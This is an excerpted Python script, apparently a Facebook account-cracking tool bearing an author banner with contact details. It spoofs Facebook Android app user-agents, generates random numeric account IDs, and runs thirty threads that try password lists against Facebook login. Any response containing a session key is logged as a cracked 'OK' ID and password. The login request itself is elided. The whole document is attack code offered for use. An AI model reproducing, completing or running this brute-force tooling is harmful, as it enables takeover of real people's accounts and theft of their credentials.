...
uas_random = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; EX10S4 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;"])
...
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"}
...
██      ██   ██ ██ ██  ██ ██ ██      ██      
██      ██   ██ ██ ██   ████  ██████ ██████PRiNCe NasiMi
AUTHER    : PRiNCe NasiMi
WHATSAPP :0701282494
BROTHER ❤️: joker  💜
Facebook : https://www.facebook.com/profile.php?id=100003616225748
...
def file_crack():
    ...
    with tred(max_workers=30) as ZIDI:
        ...
        for user in fo:
            ...
            passlist = plist
            if methd =='1':
                Nasimi.submit(api1,ids,names,passlist)
            else:
                Nasimi.submit(api1,ids,names,passlist)
    print('\033[1;37m')
    linex()
...
def afg():
    ...
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as Nasimi:
        clear()
        tl = str(len(user))
        print(' [+] Total accounts : '+tl)
        print(' [+] Selected code  : '+code)
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r [SILENT-XD]  %s|  OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [PATHAN-SILENT-OK] '+uid+' | '+pas)
...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    uid = str(po['uid'])
                    print('\r\r\033[1;32m [NasiMi-SILENT-OK] '+uid+' | '+pas)
